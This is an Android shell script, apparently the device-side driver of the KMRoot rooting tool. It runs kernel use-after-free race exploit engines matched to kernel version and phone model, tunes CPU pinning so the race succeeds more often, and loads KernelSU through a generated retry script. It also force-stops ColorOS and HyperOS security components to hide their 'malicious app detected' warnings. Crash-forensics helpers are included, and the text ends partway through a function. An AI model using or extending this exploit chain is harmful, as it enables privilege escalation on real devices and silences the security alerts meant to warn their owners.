#!/system/bin/sh
# KMRoot 0.8.10 · 设备端主流程
#   6.6  → 快速引擎 kmfast   （参考引擎 3.1 的 fast/timer：fake-cred + 内建 KSU late-load 阶段）
#   6.12 → 快速引擎 km612   （参考引擎 的 6.12.69 timer：rootd + km612su 客户端）
#   其它 → 98260 慢速链       （kmplant + kmsolve + kmsu，作为回退，不删除）
# 竞态 UAF，仅用于自有设备；任何一轮都可能内核 panic / 重启。
#
# App 侧通过环境变量下发：
#   KMROOT_DIR      工作目录（可省，默认脚本所在目录）
#   KMROOT_MGR      要使用的 ROOT 管理器包名（内置或「自定义管理器」任选）
#   KMROOT_MODE     auto | fast | 612 | slow   （auto=按内核自动选）
#   KMROOT_ANTIROOT 0 = 只做保命线(stop riskdetect)，不做激进压制（默认 0）

if [ -n "$KMROOT_DIR" ]; then
  D=$KMROOT_DIR
else
  D=$(cd "$(dirname "$0")" 2>/dev/null && pwd)
fi
[ -n "$D" ] || { echo "DEPLOY_FAIL: 无法解析工作目录"; echo "RESULT=DEPLOYFAIL"; echo DONE; exit 1; }

# ★ 0.8.83：把整棵进程树钉在同一个核上。
#   实测：引擎按 sched_getcpu() 选核去读 per_cpu/cpuN/trace_pipe_raw，
#   但 plant 阶段的子进程会落到别的核 → cpu2 的 entries 被抽干后几乎不再增长，
#   引擎读到的就是 0 字节（victim not captured）。用 taskset 强制父子同核。
KMPIN_CPU=2
# 注意：Android 的 toybox taskset 不支持 -c，要用十六进制位掩码（CPU2 → 1<<2 = 4）
KMPIN_MASK=$(printf '%x' $((1 << KMPIN_CPU)))
KMPIN=""
if command -v taskset >/dev/null 2>&1 && taskset "$KMPIN_MASK" true >/dev/null 2>&1; then
  KMPIN="taskset $KMPIN_MASK"
fi
echo "CPU_PIN: ${KMPIN:-none（taskset 不可用或掩码形式不支持，父子进程可能跨核）}"

# 工作目录必须可写（旧 root 现场可能从 root 域建过同名目录）
if ! ( : > "$D/.kmroot_wtest" ) 2>/dev/null; then
  W="$D-w"
  mkdir -p "$W" 2>/dev/null
  if ( : > "$W/.kmroot_wtest" ) 2>/dev/null; then
    rm -f "$W/.kmroot_wtest"
    # 清单必须覆盖**所有**会被用到的落地文件：以前漏了 kmfastnd / kmslow / kmslowsu /
    # prof_*.txt / kernelsu.ko / manager.apk，走到这条退化路径时会在后面报"缺少载荷"。
    for f in kmplant kmsu kmsolve kmfork kmfast kmfastnd kmfast61 km612 km612su km612n km612s \
             kmslow kmslowsu ksud kernelsu.ko manager.apk \
             trsyms.txt trsyms_pkh110.txt trsyms_612.txt \
             trprofile_pkj110.txt trprofile_pkh110.txt trslide.sh prof_*.txt; do
      [ -e "$D/$f" ] && ln -sf "$D/$f" "$W/$f" 2>/dev/null
    done
    echo "WORKDIR_MOVED: $D 不可写，改用 $W（载荷用软链接）"
    D="$W"
  else
    echo "DEPLOY_FAIL: 工作目录不可写（$D / $W）"
    echo "RESULT=DEPLOYFAIL"; echo DONE; exit 1
  fi
else
  rm -f "$D/.kmroot_wtest"
fi
cd "$D" 2>/dev/null || { echo "DEPLOY_FAIL: 工作目录不存在 $D"; echo "RESULT=DEPLOYFAIL"; echo DONE; exit 1; }
# ND 模式：/data/local/tmp 被 SELinux 禁写时，载荷直接从 nativeLibraryDir 执行
# （工作目录改用 App 外部目录，只放日志/档案）。ND 未设置时行为与以前完全一致。
ND=${KMROOT_ND:-}
KA=${KMROOT_ASSETS:-}
bpath() {
  _n=$1; _d=$2
  if [ -n "$ND" ] && [ -x "$ND/lib$_n.so" ]; then echo "$ND/lib$_n.so"; else echo "$D/$_d"; fi
}
TRFAST=$(bpath kmfast kmfast)
# ND 模式优先用打过补丁的引擎（stage 脚本写到 /sdcard/km70，绕开不可写的 /data/local/tmp）
if [ -n "$ND" ] && [ -x "$ND/libkmfastnd.so" ]; then TRFAST="$ND/libkmfastnd.so"; fi
T61269=$(bpath km612 km612)
T61269SU=$(bpath km612su km612su)
# ★ 0.8.50：参考引擎 1.91 的新版 6.12 引擎（442KB）。它把 late-load 做在 fake-cred 子进程里、
#   并在失败时把 zombie 交给 holder 进程（同 boot 可再点）。默认不用，/sdcard/kmroot-new612 开关。
T61269N=$(bpath km612n km612n)
TRPLANT=$(bpath kmplant kmplant)
TRSU=$(bpath kmsu kmsu)
TRSOLVE=$(bpath kmsolve kmsolve)
TRFORK=$(bpath kmfork kmfork)
T61269X=$(bpath km612x km612x)
TRSLIDE=$(bpath trslide trslide.sh)
T98260P=$(bpath kmslow kmslow)
T98260S=$(bpath kmslowsu kmslowsu)
[ -n "$KA" ] && [ -f "$KA/trslide.sh" ] && TRSLIDE="$KA/trslide.sh"
echo "BIN_MODE=$([ -n "$ND" ] && echo nd || echo copy)"
# 上一轮的日志先归档（以前直接 rm，导致"成功那次的证据"被下一次 ALREADY 运行删掉）
# 6.12 慢链的 plant612/probe612 也要归档：run_slow612 每轮都 rm/覆盖它们，
# 不归档就等于 98260 慢链一份证据都不留（和这条注释的初衷矛盾）。
for _l in plant.log probe.log kmfast.log km612.log plant612.log probe612.log sample.log; do
  [ -f "$_l" ] && mv -f "$_l" "${_l%.log}.prev.log" 2>/dev/null
done
rm -f sample.log 2>/dev/null

MGR=${KMROOT_MGR:-me.weishu.kernelsu}
[ -n "$MGR" ] || MGR=me.weishu.kernelsu
REQ_MODE=${KMROOT_MODE:-auto}
ANTIROOT=${KMROOT_ANTIROOT:-0}
[ -f /sdcard/kmroot-antiroot ] && ANTIROOT=1
[ -f /sdcard/kmroot-no-antiroot ] && ANTIROOT=0
SR=$(uname -r 2>/dev/null)
BOOTID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '-' | tr -d '\r')

# 持页标记：$D/held 常常被上一轮 root 创建的 root:root 文件占住，
# shell 再也写不进去（RMX5062 现场：can't create .../held: Permission denied）。
# 写不进去 = 防护失效 = 同一 boot 会二次喷射，所以这里做双份兜底 + 明确报错。
set_held() {
  [ -n "$BOOTID" ] || return 0
  for _h in "$D/held" "$D/held.alt"; do
    { echo "$BOOTID" > "$_h"; } 2>/dev/null && return 0
    rm -f "$_h" 2>/dev/null
    { echo "$BOOTID" > "$_h"; } 2>/dev/null && return 0
  done
  echo "HELD_MARK_FAIL: 持页标记两份都写不进去（$D 权限异常）→ 本次开机请务必冷重启，不要再点"
}

is_held() {
  [ -n "$BOOTID" ] || return 1
  [ "$(cat "$D/held" 2>/dev/null)" = "$BOOTID" ] && return 0
  [ "$(cat "$D/held.alt" 2>/dev/null)" = "$BOOTID" ] && return 0
  return 1
}

UPTIME=$(cut -d. -f1 /proc/uptime 2>/dev/null)
PARTIAL=0
# 计时（秒）：用 /proc/uptime 差值，跑完能给出各段耗时，便于继续提速
T0=$(cut -d. -f1 /proc/uptime 2>/dev/null)
[ -n "$T0" ] || T0=0
now_s() { cut -d. -f1 /proc/uptime 2>/dev/null; }
tlog() { _n=$(now_s); [ -n "$_n" ] || _n=$T0; echo "T_$1=$((_n - T0))s"; }

case "$SR" in
  *6.6.*)                      KBASE=66;    KMI=android15-6.6 ;;
  *6.1[2-9].*|*6.[2-9][0-9].*) KBASE=612;   KMI=android16-6.12 ;;
  *6.1.*)                       KBASE=61;    KMI=android14-6.1 ;;
  *)                           KBASE=unknown; KMI="" ;;
esac
MODE=$REQ_MODE
case "$MODE" in
  auto) case "$KBASE" in 66) MODE=fast ;; 612) MODE=612 ;; 61) MODE=fast61 ;; *) MODE=fast ;; esac ;;
  fast|612|slow|fast61|ace5) ;;
  *) MODE=slow ;;
esac
# ★ 0.9.4-ace5：一加 Ace 5 竞速版（PKB110 / PLF110 / OP60F9L1）· C17 · 6.1.157-ga05da223fb30
#   参考实现（逆向）在这台机上**不走 fast_61 的 plant**：它用自带内建偏移的 ic 核心
#   （STATIC_TIMER_SITE=0xffffffc00859ab50，运行时按 low21=0x19ab50 校准），并且按
#   uname -r 的 build 串校验 ic-syms 表。同基线的 RMX5062 在 fast_61 上是 RESULT=HELD，
#   所以 auto 模式下优先 ic 核心，失败再回退 fast_61（档案 prof_19.txt）。
ACE5=0
case "$SR" in *ga05da223fb30*) ACE5=1 ;; esac
case "$(getprop ro.product.device 2>/dev/null)|$(getprop ro.product.model 2>/dev/null)" in
  *PKB110*|*PLF110*|*OP60F9L1*|*Ace*5*竞速*) ACE5=1 ;;
esac
if [ "$ACE5" = "1" ] && [ "$KBASE" = "61" ] && [ "$REQ_MODE" = "auto" ]; then
  MODE=ace5
  echo "ACE5_ROUTE: 命中一加 Ace 5 竞速版 C17（$SR）→ ic 核心优先，fast_61 兜底"
fi
# 隐藏逃生阀：/sdcard/kmroot-slow 存在则强制走 98260 慢链（没有 UI，不影响"强制自动"）
[ -f /sdcard/kmroot-slow ] && MODE=slow
echo "KERNEL=$SR KBASE=$KBASE MODE=$MODE REQ=$REQ_MODE KMI=${KMI:-none}"
echo "BOOTID=${BOOTID:-unknown} UPTIME=${UPTIME:-0}s MGR=$MGR ANTIROOT=$ANTIROOT"

# ---------------------------------------------------------------- 通用判定
have_mod()    { grep -qi "kernelsu" /proc/modules 2>/dev/null; }   # 0.9.12：与 ladder poll_live 统一宽松口径（kernelsu_next 等变体也算 live）
mod_line()    { grep -iE "^kernelsu " /proc/modules 2>/dev/null | head -n 1; }   # 0.9.12：严格版仅用于展示
plant_alive() { pidof kmplant >/dev/null 2>&1 || pidof libkmplant.so >/dev/null 2>&1; }
fast_alive()  { pidof kmfast  >/dev/null 2>&1 || pidof libkmfast.so  >/dev/null 2>&1; }
e612_alive()  { pidof km612  >/dev/null 2>&1 || pidof libkm612.so  >/dev/null 2>&1; }

# ★ 0.8.44：引擎日志的关键证据行都在**开头**（[ids]/[base]/[cred]/stage/free_seen/[ksu]），
#   而收尾只 tail -n 12~30 → 这些行全被截掉，只能拿 TRACE_PREP 预检去猜 tracefs。
#   参考引擎 的日志之所以一眼能定位（[ids] page_alloc=334 …、每段 after XXXms、[ksu] ksud=… version=…），
#   就是因为它把这些行都留在日志里（2026-10-31 用户给的 timer.log）。这里按关键字捞一遍。
engine_digest() {
  _f=$1
  [ -f "$_f" ] || return 0
  echo "ENGINE_DIGEST: $_f"
  grep -E '^\[ids\]|^\[base\]|^\[cred\]|^\[\+\] stage|free_seen=|burst hit=|^\[slab\]|^\[ksu\]|^KSU_LOADED|^ROOT_SHELL_OK|parking without reap|page event ids not found|^\[\+\] child' "$_f" 2>/dev/null | tail -n 24 | sed 's/^/  | /'
  _ia=$(sed -n 's/^\[ids\] page_alloc=\([0-9][0-9]*\).*/\1/p' "$_f" 2>/dev/null | head -n 1)
  case "$_ia" in
    ''|0) : ;;
    *) echo "TRACE_IDS_OK: page_alloc=$_ia（引擎自己把 kmem 事件开起来了，前面的 TRACE_WARN 可以忽略）" ;;
  esac
}

su_ok() {
  # ★ 0.8.48：su 的位置**不是固定一处** —— 不同 KSU 分支/版本放的地方不一样，
  #   而且 `/data/adb/ksu/bin` 常是 0700 root，shell 域连 stat 都会被拒（`-x` 永远 false，
  #   但文件其实在）。所以判据改成"能真的拿到 uid=0"逐条试，而不是拿 `-x` 当结论。
  for _c in su /data/adb/ksu/bin/su /system/bin/su /debug_ramdisk/su /data/adb/ksu/bin/ksud.nosu "$D/su"; do
    [ -n "$_c" ] || continue
    _u=$(timeout 5 "$_c" -c 'id -u' 2>/dev/null | tr -d '\r' | tr -d ' ')
    [ "$_u" = "0" ] && return 0
  done
  return 1
}

# su 取证：把"到底是没装 / 没权限看 / 放别处"一次打清楚（0.8.48）
su_probe() {
  echo "SU_PROBE:"
  echo "  which su = $(command -v su 2>/dev/null || echo none)"
  for _p in /data/adb/ksu/bin/su /data/adb/ksud /data/adb/ksu/bin/ksud /system/bin/su /debug_ramdisk/su; do
    if [ -e "$_p" ]; then
      if [ -x "$_p" ]; then echo "  $_p = exists+exec"; else echo "  $_p = exists(no exec)"; fi
    else
      echo "  $_p = NO（或无权 stat）"
    fi
  done
  echo "  ls -ld /data/adb      : $(ls -ld /data/adb 2>&1)"
  echo "  ls -ld /data/adb/ksu  : $(ls -ld /data/adb/ksu 2>&1)"
  echo "  ls /data/adb/ksu/bin  : $(ls /data/adb/ksu/bin 2>&1 | tr '\n' ' ')"
  if su_ok; then echo "  su_ok = YES"; else echo "  su_ok = NO"; fi
}

# ROOTX：当前可用的 root 通道前缀（su 或 rootd 客户端），空 = 用 su
ROOTX=""
root_do() {
  if [ -n "$ROOTX" ]; then
    $ROOTX "$1" 2>&1 | head -n 30
  elif su_ok; then
    timeout 20 su -c "$1" 2>&1 | head -n 30
  else
    echo "NO_ROOT_CHANNEL"
  fi
}
root_q() { root_do "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------- 系统安全弹窗静默
# 漏洞提权会触发系统（ColorOS「安全警告」/ HyperOS「安全防护」）弹出
# 「检测到有恶意应用尝试破坏系统…建议立即重启设备」的对话框。
# 该弹窗由系统安全组件进程弹出，App 自身无法拦截；拿 root 后可以把它关掉。
#
# ★ 只做「强停弹窗进程」，绝不做 pm disable-user：
#   disable-user 是持久化的（写进 package-restrictions.xml），禁用安全组件会连带
#   权限管理、应用安装、卸载界面一起失效，重启也不恢复，属于自伤。
# ★ 也不碰 com.oplus.exsystemservice（管截图/桌面数据，停它会出大问题）。
sec_pkg_list() {
  pm list packages 2>/dev/null | sed 's/^package://' \
    | grep -E "securityguard|securitycenter|securitycore|safecenter|safeguard|oplus\.safe|coloros\.safe" \
    | grep -vE "exsystemservice|systemui"
}

mute_sec_popup() {
  # ① 前台是安全类窗口 → 停掉它（ColorOS 17 的警告框通常在 com.oplus.securityguard）
  _w=$(dumpsys window 2>/dev/null | grep -E "mCurrentFocus|mFocusedApp" | head -n 1)
  if [ -n "$_w" ]; then
    case "$_w" in
      *securityguard*|*securitycenter*|*securitycore*|*safecenter*|*safeguard*|*oplus\.safe*|*coloros\.safe*)
        _p=$(echo "$_w" | sed -n 's/.*[ {]\([A-Za-z0-9_.]*\)\/[A-Za-z0-9_.$]*\}.*/\1/p' | head -n 1)
        case "$_p" in
          ""|*exsystemservice*|*systemui*) ;;
          *) root_q "am force-stop $_p"; echo "SEC_MUTE: $_p" ;;
        esac
        ;;
    esac
  fi
}

# 弹窗不一定在提权瞬间出现（系统检测是异步的），所以后台轮询一小段时间后自动退出。
# 首轮顺便把系统里存在的安全类包各强停一次（force-stop 不持久化，系统会按需拉起，
# 不会像 disable-user 那样把权限管理/安装器一起搞坏）。
mute_sec_popup_bg() {
  ( for _sp in $(sec_pkg_list); do root_q "am force-stop $_sp"; done
    _i=0
    while [ "$_i" -lt 6 ]; do
      sleep 2
      mute_sec_popup
      _i=$((_i + 1))
    done
  ) >/dev/null 2>&1 &
}

# ---------------------------------------------------------------- 管理器 / ksud
KSUD=""; KSUD_SRC=""; KSUD_VER=""
probe_ksud() {
  _p=$1; _s=$2
  [ -n "$_p" ] || return 1
  [ -f "$_p" ] || return 1
  [ -x "$_p" ] || chmod 755 "$_p" 2>/dev/null
  _v=$(timeout 6 "$_p" --version 2>&1 | head -n 1 | tr -d '\r')
  case "$_v" in
    *uapi*) : ;;
    *) return 1 ;;
  esac
  KSUD=$_p; KSUD_SRC=$_s; KSUD_VER=$_v
  return 0
}

# 从管理器 APK 里直接解出它自带的 ksud（部分管理器不把 lib 目录解出来，但 APK 里一定有）
ksud_from_apk() {
  _apk=$(pm path "$MGR" 2>/dev/null | head -n 1 | sed 's/^package://' | tr -d '\r')
  [ -n "$_apk" ] || return 1
  command -v unzip >/dev/null 2>&1 || return 1
  for _e in lib/arm64-v8a/libksud.so lib/arm64/libksud.so; do
    unzip -p "$_apk" "$_e" > "$D/ksud_from_apk" 2>/dev/null || continue
    [ -s "$D/ksud_from_apk" ] || continue
    chmod 755 "$D/ksud_from_apk" 2>/dev/null
    probe_ksud "$D/ksud_from_apk" "manager:apk" && return 0
  done
  rm -f "$D/ksud_from_apk" 2>/dev/null
  return 1
}

ksud_sz() { wc -c < "$1" 2>/dev/null | tr -d ' '; }

# ★ 0.9.11：late-load 能力闸门。
#   上游 GhostKey 的真机注释（cpp/ksu_script.c，标了 late_load.rs:39/67/82）：
#   **管理器自带那份 libksud.so 常常是"旧构建"，`late-load` 只打印帮助就退出**，
#   而 KMRoot 的 select_ksud() 一直优先用管理器 cache 那份 → 模块永远不会被装进内核。
#   所以这里在选定之后**再验一次能力**：`ksud --help` 的子命令列表里有没有 late-load
#   （无害，不会真去装模块）。不支持就换一个支持的候选（内置 $D/ksud 等）。
ksud_late_gate() {
  [ -n "${KSUD:-}" ] || return 0
  # ★ 0.9.11b：幂等 —— select_ksud 的 cache 出口和主流程兜底都会调本函数，
  #   同一路径只真验一次 --help（一次最多 8s，别让两处出口各烧一遍）。
  [ "${KSUD_LATE_PATH:-}" = "$KSUD" ] && return 0
  _h=$(timeout 8 "$KSUD" --help 2>&1 | head -n 60 | tr -d '\r')
  _hn=$(printf '%s' "$_h" | head -n 1)
  case "$_h" in
    *late-load*|*late_load*)
      KSUD_LATE_PATH=$KSUD
      echo "KSUD_SIZE: $(ksud_sz "$KSUD")B src=$KSUD_SRC late=yes"
      return 0 ;;
  esac
  echo "KSUD_SIZE: $(ksud_sz "$KSUD")B src=$KSUD_SRC late=no help1='$_hn'"
  # ★ 0.9.3：兜底也走管理器侧（管理器装出来的 /data/adb/ksud），内置只作最后一条
  for _c in /data/adb/ksud /data/adb/ksu/bin/ksud "$D/ksud.cand" "$D/ksud" ${ND:+"$ND/libksud.so"}; do
    [ -f "$_c" ] || continue
    [ "$_c" = "$KSUD" ] && continue
    chmod 755 "$_c" 2>/dev/null
    _h2=$(timeout 8 "$_c" --help 2>&1 | head -n 60 | tr -d '\r')
    case "$_h2" in
      *late-load*|*late_load*)
        KSUD=$_c; KSUD_SRC="alt:$(basename "$_c")"
        # 版本号必须跟着换 —— 不换的话日志里 ver= 还是上一份的，0.9.7 现场就是被这种残留误导的
        KSUD_VER=$(timeout 6 "$_c" --version 2>&1 | head -n 1 | tr -d '\r')
        KSUD_LATE_PATH=$KSUD
        echo "KSUD_LATE_PICK: 改用 $KSUD（$(ksud_sz "$KSUD")B，ver=${KSUD_VER:-?}，--help 里有 late-load）"
        return 0 ;;
    esac
  done
  KSUD_LATE_PATH=$KSUD
  echo "KSUD_LATE_NOTFOUND: 所有候选的 --help 都没带 late-load（继续用 $KSUD_SRC，但很可能装不上模块）"
  return 0
}

# ---------------------------------------------------------------- ksud 阶梯代理
# ★ 0.9.12：引擎是 one-shot exec —— 只喂一个 ksud、只跑一次 `--kmi` 形式。
#   19:33 那轮实锤：cache 那份 ksud（--help 有 late-load、5175328B）被 exec 后
#   模块没注册、进程无踪、logcat 无痕 —— daemonize 后 stdio 全断，「静默」是常态。
#   GhostKey cpp/ksu_script.c 的真机经验：late-load 失败必须「换候选 × (kmi/bare) 阶梯重试」，
#   且 KernelSU **没有常驻 daemon**（pidof ksud 恒空是正常的，唯一判据是 /proc/modules）。
#   引擎不动 —— 解法：生成一个「代理脚本」交给引擎 exec，代理内部跑完整阶梯 + 失败取证
#   （root 身份可读 /data/adb、dmesg、tombstones、crash buffer），全程写 ksu_ladder.log。
#   候选顺序：内置 $D/ksud（6402736B，PKJ110 验证过的构建）优先 —— cache 那份已静默失败过一轮；
#   其次 select_ksud 选中的（对照）；再其次 /data/adb 的（管理器 install 过的，如有）。
write_ksud_ladder() {
  _lad="$D/ksud_ladder.sh"
  _ladlog="$D/ksu_ladder.log"
  _SEEN=""
  # ★ 0.9.12 P0-1：每轮先清掉旧 ladder 日志 —— 若本轮 root 抽奖 miss（引擎没 exec 代理），
  #   旧日志还在，KSU_LADDER_LOG 会把上一轮的证据当成本轮的回灌，足以带偏诊断
  rm -f "$_ladlog" 2>/dev/null
  {
    echo '#!/system/bin/sh'
    echo '# KMRoot 0.9.12 ksud ladder proxy -- generated by trrun.sh (do not edit)'
    echo '# engine execs this INSTEAD of a single ksud; argv is kept for reference only'
    echo "LOG='$_ladlog'"
    echo "KMI='${KMI:-android16-6.12}'"
    echo '# 0.9.12：引擎 child 的 env 未必含完整 PATH —— 显式兜底，防 grep/sleep/dmesg 全线 not found'
    echo 'export PATH=/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin'
    cat <<'LADDER1'
echo "[ladder] begin pid=$$ uid=$(id -u 2>/dev/null) enf=$(getenforce 2>/dev/null) argv=$*" > "$LOG"
sync
poll_live() {
  i=0
  while [ $i -lt 8 ]; do
    sleep 1
    if grep -qi kernelsu /proc/modules 2>/dev/null; then echo yes; return; fi
    i=$((i+1))
  done
  echo no
}
LIVE=no
USED=''
LADDER1
    printf 'for K in'
    # ★ 0.9.3：**全套只用管理器侧载荷**（对齐 Shark：它只跑 PYB110_KSUD 那一个）。
    #   理由：late-load 装的是 ksud 内嵌的 LKM，只有和管理器同源的那份才对得上 uapi/vermagic。
    #   内置 $D/ksud 是旧构建，先试它不但白等 8 秒，还可能装进版本不匹配的模块。
    for _c in "$KSUD" /data/adb/ksud /data/adb/ksu/bin/ksud; do
      [ -n "$_c" ] || continue
      case " $_SEEN " in *" $_c "*) continue ;; esac
      _SEEN="$_SEEN $_c"
      printf ' "%s"' "$_c"
    done
    echo '; do'
    cat <<'LADDER2'
  if [ ! -f "$K" ]; then echo "[ladder] skip $K (missing)" >> "$LOG"; continue; fi
  chmod 755 "$K" 2>/dev/null
  SZ=$(wc -c < "$K" 2>/dev/null)
  echo "[ladder] cand=$K size=${SZ:-?}B" >> "$LOG"
  sync
  if [ "$LIVE" != yes ]; then
    echo "[ladder] try1: $K late-load --kmi $KMI --allow-shell" >> "$LOG"
    "$K" late-load --kmi "$KMI" --allow-shell >> "$LOG" 2>&1
    echo "[ladder] try1 rc=$?" >> "$LOG"
    sync
    LIVE=$(poll_live)
    echo "[ladder] live=$LIVE after --kmi form" >> "$LOG"
    if [ "$LIVE" != yes ]; then
      echo "[ladder] try2: $K late-load (bare, embedded KMI)" >> "$LOG"
      "$K" late-load >> "$LOG" 2>&1
      echo "[ladder] try2 rc=$?" >> "$LOG"
      sync
      LIVE=$(poll_live)
      echo "[ladder] live=$LIVE after bare form" >> "$LOG"
    fi
  fi
  if [ "$LIVE" = yes ]; then
    USED=$K
    echo "[ladder] used=$K" >> "$LOG"
    break
  fi
  echo "[ladder] $K did not register the module, trying next" >> "$LOG"
LADDER2
    # 0.9.12：'done' 用 echo 发射而不是写进 heredoc —— _sh_balance 不认 heredoc 内容，
    # 会把生成脚本的 for 循环结尾误判成孤儿 done
    echo 'done'
    cat <<'LADDER3'
if [ "$LIVE" = yes ]; then
  echo "[ladder] module live -- waiting for install artifacts" >> "$LOG"
  i=0
  while [ $i -lt 8 ]; do
    if [ -e /data/adb/ksu/bin/ksud ] || [ -e /data/adb/ksud ]; then break; fi
    sleep 1
    i=$((i+1))
  done
  for P in /data/adb/ksu/bin/ksud /data/adb/ksud; do
    if [ -e "$P" ]; then echo "[ladder] installed=$P size=$(wc -c < "$P" 2>/dev/null)B" >> "$LOG"; fi
  done
  echo "[ladder] SUCCESS used=$USED" >> "$LOG"
else
  echo "[ladder] all candidates failed -- collecting forensics" >> "$LOG"
  echo "[ladder] --- dmesg tail 40 ---" >> "$LOG"
  dmesg 2>&1 | tail -n 40 >> "$LOG"
  echo "[ladder] --- tombstones ---" >> "$LOG"
  ls -lt /data/tombstones 2>&1 | head -n 6 >> "$LOG"
  for TB in $(ls -t /data/tombstones 2>/dev/null | head -n 2); do
    echo "[ladder] --- $TB head ---" >> "$LOG"
    head -n 15 "/data/tombstones/$TB" >> "$LOG" 2>&1
  done
  echo "[ladder] --- crash buffer ---" >> "$LOG"
  logcat -d -b crash -t 60 >> "$LOG" 2>&1
  echo "[ladder] END (all failed)" >> "$LOG"
fi
sync
exit 0
LADDER3
  } > "$_lad"
  chmod 755 "$_lad" 2>/dev/null
  echo "LADDER_ARMED: $_lad（顺序：${KSUD:-none} → /data/adb/ksud → 内置 $D/ksud · 失败自动取证）"
}

# ★ 0.9.13：验尸 dump —— 上一轮崩了之后，把内核日志全文落盘 + 阶梯代理进度 + bootreason 一次拿全。
#   shell 域能读 pstore（20:13 已验证），但 App 日志装不下 2MB 全文 → 全文存 $D 和 /sdcard，
#   日志里只放特征行。调用方负责 return（验尸轮不跑引擎）。每份 pstore 只验一次（.kmroot_crash_seen）。
autopsy_dump() {
  _aps="$D/pstore_last.txt"
  cp -f "$1" "$_aps" 2>/dev/null
  cp -f "$1" /sdcard/kmroot-pstore-last.txt 2>/dev/null
  echo "AUTOPSY_PSTORE_SAVED: $_aps $(wc -c < "$_aps" 2>/dev/null)B（另存 /sdcard/kmroot-pstore-last.txt，可直接拷出）"
  _panic=$(grep -acE 'die_kernel_fault|Kernel panic|Unable to handle kernel|Internal error|BUG: |Oops|Call trace|PC is at' "$_aps" 2>/dev/null)
  [ -n "$_panic" ] || _panic=0
  _wdt=$(grep -acE 'watchdog|WDT|softdog' "$_aps" 2>/dev/null)
  [ -n "$_wdt" ] || _wdt=0
  echo "AUTOPSY_HITS: panic=$_panic watchdog=$_wdt（两者都 0 = 强杀/掉电/WDT 硬复位这类无栈崩溃；watchdog 命中含开机噪音，只作线索）"
  echo "AUTOPSY_KEY_LINES:"
  grep -aE 'die_kernel_fault|Kernel panic|Unable to handle kernel|Internal error|BUG: |Oops|Call trace|PC is at|watchdog' "$_aps" 2>/dev/null | tail -n 30 | sed 's/^/  ! /'
  echo "AUTOPSY_TAIL:（最后 30 行 = 崩前最后的话）"
  tail -n 30 "$_aps" 2>/dev/null | sed 's/^/  ~ /'
  if [ -s "$D/ksu_ladder.log" ]; then
    echo "AUTOPSY_LADDER: $(wc -c < "$D/ksu_ladder.log")B（上一轮阶梯代理进度；每行 sync，崩前写到的都在这）"
    sed 's/^/  | /' "$D/ksu_ladder.log"
  else
    echo "AUTOPSY_LADDER: 空/不存在 —— 代理上一轮根本没跑起来（崩在引擎 exec 之前）"
  fi
  if [ -s km612x.prev.log ]; then
    echo "AUTOPSY_PREVLOG: $(wc -c < km612x.prev.log)B"
    tail -n 15 km612x.prev.log 2>/dev/null | sed 's/^/  | /'
  fi
  echo "AUTOPSY_BOOTREASON: $(getprop ro.boot.bootreason 2>/dev/null) $(getprop ro.boot.boot_reason 2>/dev/null) $(getprop ro.bootmode 2>/dev/null)"
  : > /sdcard/.kmroot_crash_seen 2>/dev/null
}

select_ksud() {
  # 缓存：{ksud 路径, 版本, 管理器包名}；管理器或路径变了就重探
  if [ -f "$D/.ksud_cache" ]; then
    read -r _ck < "$D/.ksud_cache"
    _cv=$(sed -n '2p' "$D/.ksud_cache" 2>/dev/null | tr -d '\r')
    _cm=$(sed -n '3p' "$D/.ksud_cache" 2>/dev/null | tr -d '\r')
    case "$_ck" in
      /data/app/*) _keep=1 ;;   # 管理器自带的 ksud：路径失效时下面的 -x 会自动重探
      *)           _keep=0 ;;   # 内置/系统 ksud：不长期占坑，等管理器装上要能自动切过去
    esac
    if [ "$_keep" = "1" ] && [ -n "$_ck" ] && [ "$_cm" = "$MGR" ] && [ -x "$_ck" ]; then
      KSUD=$_ck; KSUD_SRC=cache; KSUD_VER=$_cv
      ksud_late_gate
      return 0
    fi
  fi
  APK=$(pm path "$MGR" 2>/dev/null | head -n 1 | sed 's/^package://')
  if [ -n "$APK" ]; then
    LDIR=$(dirname "$APK")/lib/arm64
    [ -d "$LDIR" ] || LDIR=$(dirname "$APK")/lib/arm64-v8a
    probe_ksud "$LDIR/libksud.so" "manager" && return 0
    if [ -d "$LDIR" ]; then
      # SukiSU 等会把载荷改成随机 lib*.so：挑体积大的逐个验 --version
      for f in "$LDIR"/lib*.so; do
        [ -f "$f" ] || continue
        sz=$(wc -c < "$f" 2>/dev/null | tr -d ' ')
        [ "${sz:-0}" -gt 1500000 ] || continue
        cp -f "$f" "$D/ksud.cand" 2>/dev/null || continue
        probe_ksud "$D/ksud.cand" "manager:$(basename "$f")" && return 0
      done
    fi
  else
    echo "MGR_NOT_INSTALLED: $MGR"
  fi
  # 目标：优先拉起"和手机上管理器同版本"的 ksud（否则管理器会提示需要更新内核）
  ksud_from_apk && return 0
  # ★ 官方 KernelSU 管理器**不把 libksud.so 打进 APK**，它自己用的 ksud 是管理器装到
  #   `/data/adb/ksud` 的那一份 —— 只有那份内嵌的 LKM 版本与管理器一致。
  #   以前内置 `$D/ksud` 排在这一步**前面**，于是官方管理器的机器永远拉起内置版本：
  #   实测管理器 `v3.3.1 (32680-5)`、模块却是 `32565-2 自定义` + 红字「需要更新内核」。
  #   直接 exec `/data/adb/ksud` 在 shell 域可能被 SELinux 拦，所以**拷进工作目录再验**。
  for _sys in /data/adb/ksud /data/adb/ksu/bin/ksud; do
    [ -f "$_sys" ] || continue
    cp -f "$_sys" "$D/ksud.sys" 2>/dev/null || continue
    if probe_ksud "$D/ksud.sys" "manager-installed:$_sys"; then
      mv -f "$D/ksud.sys" "$D/ksud" 2>/dev/null || cp -f "$D/ksud.sys" "$D/ksud" 2>/dev/null
      rm -f "$D/ksud.sys" 2>/dev/null
      chmod 755 "$D/ksud" 2>/dev/null
      echo "KSUD_FROM_SYSTEM: 用管理器装的那份 ksud（$_sys）→ 模块版本应与管理器一致"
      return 0
    fi
  done
  rm -f "$D/ksud.sys" 2>/dev/null
  probe_ksud "$D/ksud" "builtin" || { [ -n "$ND" ] && probe_ksud "$ND/libksud.so" "builtin-nd"; }
  if [ -z "$KSUD" ]; then
    # 最后才去直接指向系统路径（这条路径在执行时可能被 SELinux 拦，所以要排在拷贝之后）
    probe_ksud "/data/adb/ksud" "system" || probe_ksud "/data/adb/ksu/bin/ksud" "system"
  fi
  if [ -z "$KSUD" ]; then KSUD=""; return 1; fi
